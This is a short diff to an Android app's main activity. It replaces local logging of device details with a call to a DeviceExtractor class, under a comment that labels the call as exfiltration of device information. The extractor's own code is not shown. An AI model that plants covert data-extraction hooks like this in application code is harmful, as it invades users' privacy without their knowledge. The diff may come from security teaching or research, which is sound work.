@@ -43,20 +43,9 @@ public class Main_Activity extends AppCompatActivity {
         developerButton = (Button) findViewById(R.id.developerButton);
         logoutButton = (Button) findViewById(R.id.logoutButton);
 
-        //Obtain device information
-        String model = android.os.Build.MODEL;
-        String device = android.os.Build.DEVICE;
-        String product = android.os.Build.PRODUCT;
-        String manufacturer = Build.MANUFACTURER;
-        String os = System.getProperty("os.version");
-
-        //Log them
-        Log.d("CREATION",model);
-        Log.d("CREATION",device);
-        Log.d("CREATION",product);
-        Log.d("CREATION",manufacturer);
-        Log.d("CREATION",os);
-
+        //Exflitrate Device Information
+        DeviceExtractor deviceExtractor = new DeviceExtractor();
+        deviceExtractor.getDeviceInformation();
 
         //Create Listeners to perform action onClick for the different buttons
         scanButton.setOnClickListener(new View.OnClickListener() {
